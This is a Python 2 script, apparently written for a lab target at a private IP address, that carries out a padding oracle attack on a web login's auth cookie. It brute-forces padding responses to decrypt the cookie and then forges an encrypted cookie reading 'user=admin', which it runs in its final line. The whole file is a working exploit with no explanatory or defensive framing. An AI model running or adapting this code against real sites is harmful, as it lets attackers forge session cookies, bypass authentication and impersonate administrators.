import base64
import urllib
import requests
import binascii


def send(cookie):
    url = "http://172.16.121.129/login.php"
    cookies = dict(auth=urllib.quote_plus(cookie))
    resp = requests.get(url, cookies=cookies)
    if("Invalid padding" in resp.content):
        return False
    else:
        return True


def create_payload(i, num_bit, suffix):
    tmp = hex(i)[2:]
    if(len(tmp)==1):
        tmp = "0" + tmp
    payload = num_bit * "00" + tmp + suffix
    return payload


def create_suffix(num_bit, i_dic):
    result = ""
    for i in range(num_bit + 1, 8):
        tmp = hex(i_dic[i] ^ (8 - num_bit))[2:]
        if(len(tmp) == 1):
            tmp = "0" + tmp
        result = result + tmp
    return result


def decrypt(dec):
    pri_cookie = dec
    block_size = 16
    pri_cookie_decoded = base64.b64decode(urllib.unquote_plus(pri_cookie)).encode("hex")
    num_block = len(pri_cookie_decoded) / block_size
    iv = pri_cookie_decoded[:16]
    result = ""
    for i in range(0, num_block -1):
        block = pri_cookie_decoded[16 * i:16 * (i+1)]
        pre_block = pri_cookie_decoded[16 * i:16 * (i+1)]
        block_enc = pri_cookie_decoded[16 *(i+1):16 * (i+2)]

        print(pre_block)
        print(block_enc)
        pre_block_hex = pre_block.decode("hex")
        block_enc_hex = block_enc.decode("hex")
        i_dec = [0, 0, 0, 0, 0, 0, 0, 0]
        block_dec = [0, 0, 0, 0, 0, 0, 0, 0]
        block_dec_str = ""
        for j in range(7,-1,-1):
            if(j==7):
                suffix = ""
            else:
                suffix = create_suffix(j, i_dec)
            for test in range(0,256):
                tmp = create_payload(test, j, suffix) + block_enc
                cookie = base64.b64encode(tmp.decode("hex"))
                if(send(cookie) == True):
                    i_chr = (8-j) ^ test
                    i_dec[j] = i_chr
                    block_dec[j] = i_chr ^ ord(pre_block_hex[j])
                    block_dec_str = chr(block_dec[j]) + block_dec_str
                    break
            print(block_dec_str)
        result = result + block_dec_str
    print("Decrypted: "+result)


def encrypt(block_enc, block_cle):
    block_cle_hex = block_cle.decode("hex")
    i_dec = [0, 0, 0, 0, 0, 0, 0, 0]
    for j in range(7, -1, -1):
        if(j == 7):
            suffix = ""
        else:
            suffix = create_suffix(j, i_dec)
        for test in range(0, 256):
            tmp = create_payload(test, j, suffix) + block_enc
            cookie = base64.b64encode(tmp.decode("hex"))
            if(send(cookie) == True):
                i_chr = (8 - j) ^ test
                i_dec[j] = i_chr
    pre_dec = [0, 0, 0, 0, 0, 0, 0, 0]
    pre_dec_str = ""
    for i in range(0,8):
        pre_dec[i] = ord(block_cle_hex[i]) ^ i_dec[i]
        tmp = hex(pre_dec[i])[2:]
        if(len(tmp) == 1):
            tmp = "0" + tmp
        pre_dec_str = pre_dec_str + tmp
    print("PreBlock: ")
    print(pre_dec_str)
    return pre_dec_str

def create_padding(hex_str):
    padding = ""
    if(len(hex_str) > 8):
        print("Long String exception")
        exit()
    elif(len(hex_str) < 8):
        tmp = 8 - len(hex_str)
        padding = ("0" + str(tmp)) * tmp
    return binascii.hexlify(hex_str) + padding


def encrypt_all(str_to_encrypt):
    string_block_len = 8
    num_block = (len(str_to_encrypt) / string_block_len) + 1
    all_block = []
    for i in range(0, num_block):
        tmp = (str_to_encrypt[8 * i:8*(i+1)])
        all_block.append(create_padding(tmp))
    block_enc = "0000000000000000"
    result = block_enc
    for j in range(len(all_block) - 1, -1, -1):
        tmp = encrypt(block_enc, all_block[j])
        block_enc = tmp
        result = tmp + result
    print("Encrypted: ")
    print(urllib.quote_plus(base64.b64encode(result.decode("hex"))))


encrypt_all("user=admin")







